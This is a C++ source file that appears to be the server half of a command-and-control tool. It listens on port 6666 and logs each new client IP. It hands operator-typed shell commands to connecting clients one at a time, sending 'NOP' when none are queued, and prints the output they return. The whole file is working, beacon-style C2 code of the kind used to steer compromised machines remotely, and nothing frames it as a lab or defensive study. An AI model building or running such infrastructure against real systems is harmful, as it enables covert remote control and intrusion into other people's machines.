#include <csignal>
#include <cstdint>
#include <iostream>
#include <string>
#include <cstring>
#include <mutex>
#include <queue>
#include <thread>
#include <chrono>
#include <memory>
#include <atomic>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <unordered_set>
#include <cstdio>
#include "utils.h"

using namespace std;

atomic<bool> running = true;
int sockfd = -1;
queue<string> commands{};
mutex deadlock;

void closeSocket(int sig)
{
    running = false;
    close(sockfd);
}

int server_setup(int port)
{
    int listenfd = socket(AF_INET, SOCK_STREAM, 0);

    if (listenfd == -1)
    {
        cout << "Socket creation failed." << endl;
        return -1;
    }

    // in case server crashes -- freeing up socket
    int opt = 1;
    setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(port);
    socklen_t len = sizeof(serverAddr);

    int bnd = bind(listenfd, reinterpret_cast<sockaddr*>(&serverAddr), len);

    if (bnd == -1)
    {
        cout << "Issue Binding. Port in Use?" << endl;
        close(listenfd);
        return -1;
    }

    int lst = listen(listenfd, 3);

    if (lst == -1)
    {
        cout << "[server] Issue Establishing Listener." << endl;
        close(listenfd);
        return -1;
    }

    cout << "[server] listening on " << port << endl;

    return listenfd;
}

void main_handler(atomic<bool>& running)
{
    while (running)
    {
        string command{};
        cout << "> ";
        getline(cin, command);
        {
            lock_guard<mutex> guard(deadlock);
            commands.push(command);
        }
    }
}

int connection_handler(int fd, atomic<bool>& running)
{
    sockaddr_in clientAddr;
    socklen_t len = sizeof(clientAddr);
    unordered_set<string> seenIPs;

    while (running)
    {   
        string cmd{};
        string output{};

        int connfd = accept(fd, reinterpret_cast<sockaddr*>(&clientAddr), &len);
        
        if (connfd == -1)
        {
            cout << "[server] Connection Error. Trying Again." << endl;
            this_thread::sleep_for(chrono::seconds(2));
            continue;
        }

        char ipStr[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, ipStr, INET_ADDRSTRLEN);

        if (seenIPs.find(ipStr) == seenIPs.end())
        {
            cout << "[server] New Connection From: " << ipStr << endl;
            seenIPs.insert(ipStr);
        }

        {
            lock_guard<mutex> guard(deadlock);
            if (!commands.empty())
            {
                cmd = commands.front();
                commands.pop();
            }
        }

        if (!cmd.empty())
        {
            send_all(connfd, cmd);
        }
        else
        {
            send_all(connfd, "NOP");
        }

        output = recv_all(connfd); // receiving any command output

        if (output.empty())
        {
            cout << "[server] Empty String." << endl; // possible error
            close(connfd);
            continue;
        }
        else
        {
            cout << output << endl;
            close(connfd);
        }
    }

    return 0;
}


int main()
{
    int port = 6666;
    sockfd = server_setup(6666);

    signal(SIGINT, closeSocket);
    signal(SIGTERM, closeSocket);

    thread connectionThread(connection_handler, sockfd, ref(running));
    thread mainThread(main_handler, ref(running));

    // wait here
    connectionThread.join();
    mainThread.join();
}